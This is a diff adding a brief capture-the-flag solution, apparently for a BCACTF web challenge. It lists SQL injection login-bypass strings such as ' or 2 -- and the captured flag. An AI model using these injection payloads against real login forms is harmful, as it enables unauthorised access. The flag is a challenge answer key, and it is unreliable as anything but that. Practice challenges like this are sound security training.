@@ -1,0 +1,11 @@
+admin' or '3' like '3'-- -
+asd
+```
+bcactf{gu3ss_th3r3s_n0_st0pp1ng_y0u!}
+```
+
+
+
+============= Other solution =============
+' or 2 --
+' or 3-2 --
